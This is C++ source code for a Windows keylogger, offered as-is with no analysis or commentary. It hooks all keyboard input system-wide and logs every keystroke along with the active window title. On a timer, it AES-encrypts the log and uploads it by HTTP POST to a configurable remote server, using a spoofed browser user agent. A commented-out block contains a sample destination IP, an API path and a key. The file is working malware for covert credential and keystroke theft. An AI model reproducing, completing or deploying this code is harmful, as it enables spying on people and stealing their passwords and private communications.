
#include <Windows.h>
#include <wincrypt.h>

#include<fstream>
#include<windows.h>
#include <wincrypt.h>
#include <intsafe.h>
#include <winternl.h>
#include <Shlwapi.h>
#include <iostream>
#include <WinInet.h>
#include "tinyaes.h"
#include "pkcs7.h"

#pragma comment(lib,"Crypt32.lib")
#pragma comment(lib,"wininet.lib")
#pragma comment(lib,"shlwapi.lib")
#pragma comment(lib, "advapi32.lib")
using namespace std;
char* buffer = NULL;
char* name = NULL;
DWORD total_size = 1;
HANDLE hTimer = NULL;
typedef struct keylog_struct {
	char destip[20];
	int destport;
	char path[100];
	int timer;
	char commkey[50];

}keylog_struct, * Pkeylog_struct;

Pkeylog_struct skeylog = NULL;
inline char* make_hdrs(char* content_upload) {
	char* line = (char*)"\r\n\r\n";
	static char boundary[] = "---------------------------234234235345436";
	char* content_dep = (char*)"Content-Disposition: form-data;";
	char* name = (char*)"name=\"l\";";
	char* filename = (char*)"test.tmp";
	char* content_type = (char*)"Content-Type:multipart/form-data;";
	DWORD hdr_size = strlen(boundary) + strlen(content_dep) + strlen(name) + strlen(filename) + strlen(content_type) + strlen(content_upload) + 1000;
	char* header = (char*)malloc(hdr_size);
	ZeroMemory(header, hdr_size);
	;
	sprintf(header, "--%s\r\nContent-Disposition: form-data;name=\"l\"; filename = \"%s\"\r\n", boundary, filename);
	sprintf(header, "%sContent-Type: %s\r\n", header, content_type);
	sprintf(header, "%s\r\n%s", header, content_upload);
	sprintf(header, "%s\r\n\n--%s--\r\n", header, boundary);

	return header;



}

char sz_iv[20];

char* get_hex(char* cms) {

	DWORD in_len = strlen(cms);
	DWORD len = 0;

	CryptStringToBinaryA(
		cms,
		strlen(cms),
		CRYPT_STRING_HEX,
		NULL,
		&len,
		NULL,
		NULL);

	char* out_buff = (char*)malloc(len + 1);
	ZeroMemory(out_buff, len + 1);
	CryptStringToBinary(cms, strlen(cms), CRYPT_STRING_HEX, (BYTE*)out_buff, &len, NULL, NULL);
	return out_buff;
}
char* conv_hex(char* cms, DWORD sbuff, DWORD* dw_len) {

	DWORD in_len = sbuff;
	DWORD len = 0;
	CryptBinaryToString(
		(BYTE*)cms,
		in_len,
		CRYPT_STRING_HEXRAW | CRYPT_STRING_NOCRLF,
		NULL,
		&len);
	char* out_buff = (char*)malloc(len * 2 + 1);
	ZeroMemory(out_buff, len * 2 + 1);
	strcpy(out_buff, cms);
	CryptBinaryToStringA((BYTE*)cms, in_len, CRYPT_STRING_HEXRAW | CRYPT_STRING_NOCRLF, out_buff, &len);
	*dw_len = len;
	return out_buff;
}
void get_iv(char str[], int length) {

	//hexadecimal characters
	char hex_characters[] = { '0','1','2','3','4','5','6','7','8','9','A','B','C','D','E','F' };

	int i;
	for (i = 0; i < length; i++)
	{
		str[i] = hex_characters[rand() % 16];
	}
	str[length] = 0;


}




using std::string;





char* AesEncrypt(char* iv, char* comm_key, DWORD* dw_retsize, char* sbuff)
{
	DWORD fin_len = strlen(sbuff);
	char* pbuff = (char*)malloc(fin_len * 2);
	ZeroMemory(pbuff, fin_len * 2);
	strcpy(pbuff, sbuff);
	DWORD save_len = fin_len;
	DWORD dwlen = fin_len;
	AES_ctx ctx;
	ZeroMemory(&ctx.Iv, 16);
	ZeroMemory(&ctx.RoundKey, 176);
	AES_init_ctx_iv(&ctx, (unsigned char*)comm_key, (unsigned char*)iv);
	AES_CBC_encrypt_buffer(&ctx, (unsigned char*)pbuff, fin_len);
	DWORD dwsz_size = pkcs7_padding_pad_buffer((uint8_t*)pbuff, fin_len, fin_len * 2, 16);
	DWORD dwsz_fin_size = fin_len + dwsz_size;
	*dw_retsize = dwsz_fin_size;

	return pbuff;
}



inline char* crypt_upload(char* comm_key, char* buffer, int buffer_size, char* buff) {
	char iv[50];
	ZeroMemory(iv, 50);
	get_iv(iv, 32);
	DWORD pev_sslen = strlen(iv);
	char* ss = get_hex(iv);

	char* sz_buff = buffer;
	std::string sziv = iv;
	DWORD dw_size = 0;
	DWORD ret_size = 0;
	sz_buff = AesEncrypt(ss/*iv*/, comm_key, &ret_size, buff);

	sziv = iv;
	DWORD szz_len = strlen((char*)iv);
	DWORD s_iv_len = strlen(iv);
	DWORD in_len = ret_size;
	char* fin_buff = sz_buff;
	CryptBinaryToString(
		(BYTE*)fin_buff,
		ret_size,
		CRYPT_STRING_HEXRAW | CRYPT_STRING_NOCRLF,
		NULL,
		&in_len);
	DWORD len = 0;
	char* out_buff = (char*)malloc(in_len + 1);
	ZeroMemory(out_buff, in_len + 1);
	CryptBinaryToStringA((BYTE*)fin_buff, ret_size, CRYPT_STRING_HEXRAW | CRYPT_STRING_NOCRLF, out_buff, &in_len);
	char* space = (char*)" ";
	char* back = (char*)" ";
	char* form_final_buffer = (char*)malloc(in_len + strlen((char*)iv) + 10 + strlen(back));
	ZeroMemory(form_final_buffer, in_len + strlen((char*)iv) + 10 + strlen(back));
	std::string backkk = "\n";
	std::string out_buffer = out_buff;
	std::string s = (char*)iv;
	DWORD dw_s = strlen((char*)iv);
	std::string final_stringss = s + out_buffer;
	int x = s.length();
	char* chu = (char*)malloc(strlen(final_stringss.c_str()) + 10);
	ZeroMemory(chu, strlen(final_stringss.c_str()) + 10);
	strcpy(chu, final_stringss.c_str());
	return chu;

}

inline void upload(char* dest_ip, int dest_port, char* content_upload, char* path, char* comm_key, char* buffer) {
	char* crypted_upload = (char*)crypt_upload(comm_key, content_upload, strlen(content_upload) + 1, buffer);

	char* hdr = make_hdrs(crypted_upload);
	char* header = (char*)"Content-Type: multipart/form-data; boundary=---------------------------234234235345436";

	HINTERNET session = InternetOpen("Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.5) Gecko/20091102 Firefox/3.5.5 (.NET CLR 3.5.30729)", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
	HINTERNET connect = InternetConnect(session, dest_ip, dest_port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 1);
	HINTERNET request = HttpOpenRequest(connect, (const char*)"POST", path, NULL, NULL, NULL, INTERNET_FLAG_RELOAD, NULL);
	HttpSendRequest(request, header, strlen(header), hdr, strlen(hdr));
	ExitProcess(0);
	DWORD dwerror = GetLastError();
	InternetCloseHandle(session);
	InternetCloseHandle(connect);

	InternetCloseHandle(request);


}































































































static char prev_windows_title[258];

int isCapsLock(void)
{
	return (GetKeyState(VK_CAPITAL) & 0x0001);
}
LRESULT CALLBACK kb_hook(int nCode, WPARAM wParam, LPARAM lParam) {
	BOOL new_window_title = FALSE;	DWORD window_title_size = 0;
	char window_title[256];


	HWND foreground = GetForegroundWindow();
	DWORD window_title_index = 0;
	if (foreground)
	{
		GetWindowText(foreground, window_title, 256);
		if (strcmp(window_title, prev_windows_title)) {
			new_window_title = TRUE;
		}
	}
	ZeroMemory(prev_windows_title, 258);
	strcpy(prev_windows_title, window_title);

	char* back = (char*)"\n";



	KBDLLHOOKSTRUCT kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);

	int msg = 1 + (kbdStruct.scanCode << 16) + (kbdStruct.flags << 24);
	char sz_special_key_name[64];
	ZeroMemory(sz_special_key_name, 64);

	KBDLLHOOKSTRUCT* pkeyboard_hook = (KBDLLHOOKSTRUCT*)lParam;
	char val[5];
	DWORD dwMsg = 1;
	switch (wParam) {
	case WM_KEYDOWN: {
		DWORD vkCode = pkeyboard_hook->vkCode;
		if ((vkCode >= 39) && (vkCode <= 64)) {
			if (GetAsyncKeyState(VK_SHIFT)) {
				switch (vkCode) {
				case 0x30: {
					strcpy(sz_special_key_name, ")");
					break;
				}
				case 0x31: {
					strcpy(sz_special_key_name, "!");
					break;
				}
				case 0x32: {
					strcpy(sz_special_key_name, "@");
					break;
				}
				case 0x33: {
					strcpy(sz_special_key_name, "#");
					break;
				}
				case 0x34: {
					strcpy(sz_special_key_name, "$");
					break;
				}
				case 0x35: {
					strcpy(sz_special_key_name, "%");
					break;
				}
				case 0x36: {
					strcpy(sz_special_key_name, "^");
					break;
				}
				case 0x37: {
					strcpy(sz_special_key_name, "&");
					break;
				}
				case 0x38: {
					strcpy(sz_special_key_name, "*");
					break;
				}
				case 0x39: {
					strcpy(sz_special_key_name, "(");
					break;
				}

				}

			}
			else {
				sprintf(sz_special_key_name, "%c", vkCode);
			}
			/*else {

			}*/

		}
		else if ((vkCode > 64) && (vkCode < 91)) {
			if (!(GetAsyncKeyState(VK_SHIFT) ^ isCapsLock())) {
				vkCode += 32;
				sprintf(sz_special_key_name, "%c", vkCode);

			}
		}
		else {
			switch (vkCode) {
			case VK_CANCEL: {
				strcpy(sz_special_key_name, "[cancel]");
				break;
			}
			case VK_SPACE: {
				strcpy(sz_special_key_name, " ");
				break;

			}
			case VK_LCONTROL: {
				strcpy(sz_special_key_name, "[LCtrl]");
				break;
			}
			case VK_RCONTROL: {
				strcpy(sz_special_key_name, "[RAtl]");
				break;
			}
			case VK_LMENU: {
				strcpy(sz_special_key_name, "[LAlt]");
				break;
			}
			case VK_RMENU: {
				strcpy(sz_special_key_name, "[RAlt]");
				break;
			}
			case VK_LWIN: {
				strcpy(sz_special_key_name, "[LWindows]");
				break;
			}
			case VK_RWIN: {
				strcpy(sz_special_key_name, "[RWindows]");
				break;
			}

			case VK_APPS: {
				strcpy(sz_special_key_name, "[Applications]");
				break;
			}
			case VK_SNAPSHOT: {
				strcpy(sz_special_key_name, "[PrintScreen]");
				break;
			}
			case VK_INSERT: {
				strcpy(sz_special_key_name, "[Insert]");
				break;
			}
			case VK_PAUSE: {
				strcpy(sz_special_key_name, "[Pause]");
				break;

			}
			case VK_VOLUME_MUTE: {
				strcpy(sz_special_key_name, "[VolumeMute]");
				break;
			}
			case VK_VOLUME_DOWN: {
				strcpy(sz_special_key_name, "[VolumeDown]");
				break;
			}
			case VK_VOLUME_UP: {
				strcpy(sz_special_key_name, "[VolumeUp]");
				break;
			}
			case VK_SELECT: {
				strcpy(sz_special_key_name, "[Select]");
				break;
			}
			case VK_HELP: {
				strcpy(sz_special_key_name, "[Help]");
				break;
			}
			case VK_EXECUTE: {
				strcpy(sz_special_key_name, "[Execute]");
				break;
			}
			case VK_DELETE: {
				strcpy(sz_special_key_name, "[Delete]");
				break;
			}
			case VK_CLEAR: {
				strcpy(sz_special_key_name, "[Clear]");
				break;
			}
			case VK_RETURN: {
				strcpy(sz_special_key_name, "[Enter]");
				break;
			}
			case VK_BACK: {
				strcpy(sz_special_key_name, "[BackSpace]");
				break;
			}
			case VK_TAB: {
				strcpy(sz_special_key_name, "[Tab]");
				break;
			}
			case VK_ESCAPE: {
				strcpy(sz_special_key_name, "[Escape]");
				break;
			}
			case VK_LSHIFT: {
				strcpy(sz_special_key_name, "[LShift]");
				break;
			}
			case VK_RSHIFT: {
				strcpy(sz_special_key_name, "[RShift]");
				break;
			}
			case VK_CAPITAL: {
				strcpy(sz_special_key_name, "[CapsLock]");
				break;
			}
			case VK_NUMLOCK: {
				strcpy(sz_special_key_name, "[NumLock]");
				break;
			}
			case VK_SCROLL: {
				strcpy(sz_special_key_name, "[ScrollLock]");
				break;
			}
			case VK_HOME: {
				strcpy(sz_special_key_name, "[Home]");
				break;
			}
			case VK_END: {
				strcpy(sz_special_key_name, "[End]");
				break;

			}
			case VK_PLAY: {
				strcpy(sz_special_key_name, "[Play]");
				break;
			}
			case VK_ZOOM: {
				strcpy(sz_special_key_name, "[Zoom]");
				break;
			}
			case VK_DIVIDE: {
				strcpy(sz_special_key_name, "[/]");
				break;
			}
			case VK_MULTIPLY: {
				strcpy(sz_special_key_name, "[*]");
				break;
			}
			case VK_SUBTRACT: {
				strcpy(sz_special_key_name, "[-]");
				break;
			}
			case VK_ADD: {
				strcpy(sz_special_key_name, "[+]");
				break;
			}
			case VK_PRIOR: {
				strcpy(sz_special_key_name, "[PageUp]");
				break;
			}
			case VK_NEXT: {
				strcpy(sz_special_key_name, "[PageDown]");
				break;
			}
			case VK_LEFT: {
				strcpy(sz_special_key_name, "[LArrow]");
				break;
			}
			case VK_RIGHT: {
				strcpy(sz_special_key_name, "[RArrow]");
				break;
			}
			case VK_UP: {
				strcpy(sz_special_key_name, "[UpArrow]");
				break;
			}
			case VK_DOWN: {
				strcpy(sz_special_key_name, "[DownArrow]");
				break;
			}
			case VK_NUMPAD0: {
				strcpy(sz_special_key_name, "[0]");
				break;
			}
			case VK_NUMPAD1: {
				strcpy(sz_special_key_name, "[1]");
				break;
			}
			case VK_NUMPAD2: {
				strcpy(sz_special_key_name, "[2]");
				break;
			}
			case VK_NUMPAD3: {
				strcpy(sz_special_key_name, "[3]");
				break;
			}
			case VK_NUMPAD4: {
				strcpy(sz_special_key_name, "[4]");
				break;
			}
			case VK_NUMPAD5: {
				strcpy(sz_special_key_name, "[5]");
				break;
			}
			case VK_NUMPAD6: {
				strcpy(sz_special_key_name, "[6]");
				break;
			}
			case VK_NUMPAD7: {
				strcpy(sz_special_key_name, "[7]");
				break;
			}
			case VK_NUMPAD8: {
				strcpy(sz_special_key_name, "[8]");
				break;
			}
			case VK_NUMPAD9: {
				strcpy(sz_special_key_name, "[9]");
				break;
			}
			case VK_F1: {
				strcpy(sz_special_key_name, "[F1]");
				break;
			}
			case VK_F2: {
				strcpy(sz_special_key_name, "[F2]");
				break;
			}
			case VK_F3: {
				strcpy(sz_special_key_name, "[F3]");
				break;
			}
			case VK_F4: {
				strcpy(sz_special_key_name, "[F4]");
				break;
			}
			case VK_F5: {
				strcpy(sz_special_key_name, "[F5]");
				break;
			}
			case VK_F6: {
				strcpy(sz_special_key_name, "[F6]");
				break;
			}
			case VK_F7: {
				strcpy(sz_special_key_name, "[F7]");
				break;
			}
			case VK_F8: {
				strcpy(sz_special_key_name, "[F8]");
				break;
			}
			case VK_F9: {
				strcpy(sz_special_key_name, "[F9]");
				break;
			}
			case VK_F10: {
				strcpy(sz_special_key_name, "[F10]");
				break;
			}
			case VK_F11: {
				strcpy(sz_special_key_name, "[F11]");
				break;
			}
			case VK_F12: {
				strcpy(sz_special_key_name, "[F12]");
				break;
			}

			case VK_F13: {
				strcpy(sz_special_key_name, "[F13]");
				break;
			}
			case VK_F14: {
				strcpy(sz_special_key_name, "[F14]");
				break;
			}
			case VK_F15: {
				strcpy(sz_special_key_name, "[F15]");
				break;
			}
			case VK_F16: {
				strcpy(sz_special_key_name, "[F16]");
				break;
			}

			case VK_F17: {
				strcpy(sz_special_key_name, "[F17]");
				break;

			}
			case VK_F18: {
				strcpy(sz_special_key_name, "[F18]");
				break;
			}
			case VK_F19: {
				strcpy(sz_special_key_name, "[F19]");
				break;
			}
			case VK_F20: {
				strcpy(sz_special_key_name, "[F20]");
				break;
			}
			case VK_F21: {
				strcpy(sz_special_key_name, "[F21]");
				break;
			}
			case VK_F22: {
				strcpy(sz_special_key_name, "[F22]");
				break;
			}
			case VK_F23: {
				strcpy(sz_special_key_name, "[F23]");
				break;
			}
			case VK_F24: {
				strcpy(sz_special_key_name, "[F24]");
				break;
			}
			case VK_OEM_2: {
				if (GetAsyncKeyState(VK_SHIFT))
					strcpy(sz_special_key_name, "?");
				else
					strcpy(sz_special_key_name, "/");
				break;
			}
			case VK_OEM_3: {
				if (GetAsyncKeyState(VK_SHIFT))
					strcpy(sz_special_key_name, "~");
				else
					strcpy(sz_special_key_name, "`");
				break;
			}
			case VK_OEM_4: {
				if (GetAsyncKeyState(VK_SHIFT))
					strcpy(sz_special_key_name, "{");
				else
					strcpy(sz_special_key_name, "}");

				break;
			}
			case VK_OEM_5: {
				if (GetAsyncKeyState(VK_SHIFT))
					strcpy(sz_special_key_name, "|");
				else
					strcpy(sz_special_key_name, "\\");
				break;
			}
			case VK_OEM_6: {
				if (GetAsyncKeyState(VK_SHIFT))
					strcpy(sz_special_key_name, "}");
				else
					strcpy(sz_special_key_name, "]");

				break;
			}
			case VK_OEM_7: {
				if (GetAsyncKeyState(VK_SHIFT))
					strcpy(sz_special_key_name, "\\");
				else
					strcpy(sz_special_key_name, "'");
				break;
			}

			case 0xBC: {
				if (GetAsyncKeyState(VK_SHIFT))
					strcpy(sz_special_key_name, "<");
				else
					strcpy(sz_special_key_name, ",");

				break;
			}
			case 0xBE: {
				if (GetAsyncKeyState(VK_SHIFT))
					strcpy(sz_special_key_name, ">");
				else
					strcpy(sz_special_key_name, ".");
				break;
			}
			case 0xBA: {
				if (GetAsyncKeyState(VK_SHIFT))
					strcpy(sz_special_key_name, ":");
				else
					strcpy(sz_special_key_name, ";");
				break;

			}
			case 0xBD: {
				if (GetAsyncKeyState(VK_SHIFT))
					strcpy(sz_special_key_name, "_");
				else
					strcpy(sz_special_key_name, "-");
				break;
			}
			case 0xBB: {
				if (GetAsyncKeyState(VK_SHIFT))
					strcpy(sz_special_key_name, "+");
				else
					strcpy(sz_special_key_name, "=");
				break;

			}
			default:
				GetKeyNameTextA(msg, sz_special_key_name, 64);
				break;
			}


		}

		window_title_size = strlen(window_title);


		total_size += window_title_size + 1 + strlen(back) + strlen(back) + strlen(sz_special_key_name) + (strlen(back));


		buffer = (char*)HeapReAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, buffer, total_size + strlen(back) + 1);
		if (new_window_title) {
			strcat(buffer, window_title);
			strcat(buffer, back);
			strcat(buffer, sz_special_key_name);
			strcat(buffer, back);

		}
		else {
			strcat(buffer, sz_special_key_name);
		}






		if (WaitForSingleObject(hTimer, 0) == WAIT_OBJECT_0) {






			upload(skeylog->destip, skeylog->destport, (char*)buffer, skeylog->path, skeylog->commkey, buffer);
			ExitProcess(0);
		}

	}
	}
	return CallNextHookEx(NULL, nCode, wParam, lParam);
}


int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {




	skeylog = (Pkeylog_struct)malloc(sizeof(keylog_struct));
	HANDLE std_in, std_out = NULL;
	std_out = GetStdHandle(STD_OUTPUT_HANDLE);
	std_in = GetStdHandle(STD_INPUT_HANDLE);
	if ((std_in == INVALID_HANDLE_VALUE) || (std_out == INVALID_HANDLE_VALUE))
		ExitProcess(1);


	ZeroMemory(skeylog, sizeof(keylog_struct));
	DWORD dwbuff = 0;
	while (!ReadFile(std_in, skeylog, sizeof(keylog_struct), &dwbuff, NULL)) {

	}

	buffer = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 1);
	ZeroMemory(buffer, 1);
	HHOOK kbhkk = SetWindowsHookEx(WH_KEYBOARD_LL, kb_hook, NULL, 0);
	/*strcpy(skeylog->destip,(char*)"192.168.10.142");
	strcpy(skeylog->path, (char*)"/luutdz/api/ml/");
	strcpy(skeylog->commkey, "f7228a0d00708466");
	skeylog->destport = 8080;*/


	LARGE_INTEGER liDueTime;
	
	int sec = skeylog->timer * 60;
	liDueTime.QuadPart = -10000000LL * sec;

	hTimer = CreateWaitableTimer(NULL, TRUE, NULL);

	SetWaitableTimer(hTimer, &liDueTime, 0, NULL, NULL, 0);


	MSG msg;
	while (GetMessage(&msg, NULL, NULL, NULL) != 0) {
		TranslateMessage(&msg);
		DispatchMessage(&msg);

	}
	return 0;
}